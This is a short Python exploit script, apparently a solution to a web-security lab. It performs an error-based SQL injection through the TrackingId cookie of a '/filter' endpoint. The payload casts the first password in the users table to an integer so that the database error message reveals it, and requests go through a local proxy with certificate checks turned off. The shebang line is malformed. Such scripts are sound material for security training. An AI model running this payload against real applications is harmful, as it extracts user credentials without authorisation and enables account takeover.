#!/usr/bin/env/[python3]
# -*- coding: utf-8 -*-

import requests
import sys
import re

"""Visible error based SQL injection"""


def exploit(base_url: str) -> None:
    response = requests.get(
        base_url + "/filter",
        cookies={"TrackingId": f"'OR 1=CAST((SELECT password FROM users LIMIT 1) AS int)--"},
        proxies={"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"},
        verify=False,
    )
    #m=re.search(r'<h4>ERROR: invalid input syntax for type integer: \"(.+)\"',response.text), #regex match which looks for the password, regex made on regex101.com
    #print(m[0])#this is the password
    print(response.text)



def main() -> None:
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} ,<base_url>")
        exit(1)
    requests.packages.urllib3.disable_warnings()
    exploit(sys.argv[1].rstrip("/"))


if __name__ == "__main__":
    main()
    
    
    

